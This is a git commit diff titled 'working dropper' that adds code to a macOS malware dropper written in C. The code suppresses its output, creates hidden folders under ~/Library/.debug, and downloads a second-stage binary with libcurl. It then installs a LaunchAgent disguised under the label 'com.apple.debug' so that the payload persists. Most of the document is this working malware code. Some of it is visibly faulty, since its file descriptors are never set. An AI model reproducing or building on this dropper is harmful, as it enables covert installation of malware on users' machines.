4acd4f5d8709812b3ada7746a9a3b6cc3ed1eae1
Henry Pitcairn <735tesla@gmail.com>
2016-02-29 09:00:09 -0500

    working dropper

--- dropper.sys/dropper.sys/main.c
+++ dropper.sys/dropper.sys/main.c
@@ -9,6 +9,8 @@
 #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
 
 #include <stdio.h>
+#include <sys/stat.h>
+#include <curl/curl.h>
 #include <CoreFoundation/CoreFoundation.h>
 
 #define LABEL "com.apple.debug"
@@ -16,14 +18,67 @@
 #define METASTASYS_EXECUTABLE "~/Library/.debug/debug-client"
 #define LOAD_COMMAND "/bin/launchctl load -w " RELATIVE_PATH
 #define START_COMMAND "/bin/launchctl start " LABEL
+#define EXECUTABLE "http://127.0.0.1:8080/downloads/metast.sys"
+#define METAST_DEBUG 1
 
+void silence_output(int fdIn, int fdOut);
 void create_launch_plist(void);
 void load_launch_plist(void);
+void create_folder_tree(void);
+void download_components(void);
 
 int main(int argc, const char * argv[]) {
+    int fdIn, fdOut;
+    if (!METAST_DEBUG) {
+        open("/dev/null", O_WRONLY);
+        open("/dev/null", O_RDONLY);
+        silence_output(fdIn, fdOut);
+    }
+    chdir(getenv("HOME"));
+    create_folder_tree();
+    download_components();
     create_launch_plist();
     load_launch_plist();
+    if (!METAST_DEBUG) {
+        close(fdIn);
+        close(fdOut);
+    }
     return 0;
+}
+
+void silence_output(int fdIn, int fdOut) {
+    dup2(fdIn, STDIN_FILENO);
+    dup2(fdOut, STDOUT_FILENO);
+    dup2(fdOut, STDERR_FILENO);
+}
+
+void create_folder_tree(void) {
+    mkdir("Library/.debug", 0777);
+    mkdir("Library/.debug/.bin", 0777);
+    mkdir("Library/.debug/.plugins", 0777);
+    mkdir("Library/.debug/.resources", 0777);
+}
+
+ssize_t write_callback(void *buf, size_t buf_size, size_t nents, FILE *outfd) {
+    return fwrite(buf, buf_size, nents, outfd);
+}
+
+void download_components(void) {
+    CURL *curl;
+    FILE *fp;
+    if ((curl = curl_easy_init())) {
+        if ((fp = fopen("Library/.debug/.bin/debug", "wb"))) {
+            curl_easy_setopt(curl, CURLOPT_URL, EXECUTABLE);
+            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+            curl_easy_setopt(curl, CURLOPT_VERBOSE, METAST_DEBUG);
+            curl_easy_perform(curl);
+            curl_easy_cleanup(curl);
+            fclose(fp);
+        } else {
+            curl_easy_cleanup(curl);
+        }
+    }
 }
 
 char *get_output_path(void) {
@@ -48,7 +103,7 @@ void create_launch_plist(void) {
     free(output);
     CFStringRef arguments[2];
     arguments[0] = CFSTR(METASTASYS_EXECUTABLE);
-    arguments[1] = CFSTR("--daemonize");
+    arguments[1] = CFSTR("--zombie");
     CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 2, &kCFTypeArrayCallBacks);
     
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -74,7 +129,6 @@ void create_launch_plist(void) {
 }
 
 void load_launch_plist(void) {
-    chdir(getenv("HOME"));
     system(LOAD_COMMAND);
     system(START_COMMAND);
 }
